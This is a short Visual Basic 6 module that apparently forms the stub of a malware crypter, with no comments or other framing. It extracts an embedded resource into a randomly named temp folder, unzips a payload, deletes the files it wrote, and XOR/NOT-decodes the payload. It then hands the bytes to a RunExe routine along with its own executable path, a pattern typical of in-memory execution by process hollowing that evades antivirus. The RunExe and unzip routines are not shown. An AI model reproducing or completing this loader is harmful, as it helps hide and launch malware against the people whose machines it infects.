Attribute VB_Name = "mMod"


Private Sub Main()

Call MainRun

End Sub

Function RandomString(cb As Integer) As String
    Randomize
    Dim rgch As String
    rgch = "abcdefghijklmnopqrstuvwxyz"
    rgch = rgch & UCase(rgch) & "0123456789"

    Dim i As Long
    For i = 1 To cb
        RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next

End Function

Private Sub MainRun()
Dim i As Long
Dim File() As Byte
Dim ExPath As String
    ExPath = Environ("TMP") & "\" & RandomString(5)
    
    File = LoadResData(102, "CUSTOM")
    MkDir ExPath & "\"
    
    Open ExPath & "\Data.zip" For Binary Access Write As #1
        Put #1, , File
    Close #1
    
    If ShellUnzip(ExPath & "\Data.zip", ExPath & "\") = True Then
        Open ExPath & "\Data.bin" For Binary As #1
        ReDim File(LOF(1))
        Get #1, , File
    Close #1
    Else
        End
    End If
    
    Kill ExPath & "\Data.zip"
    Kill ExPath & "\Data.bin"
    RmDir (ExPath & "\")
    
    For i = 0 To UBound(File)
        File(i) = File(i) Xor &H31
        File(i) = Not File(i)
    Next
        
    Call RunExe(App.Path & "\" & App.EXEName & ".exe", File)
End Sub
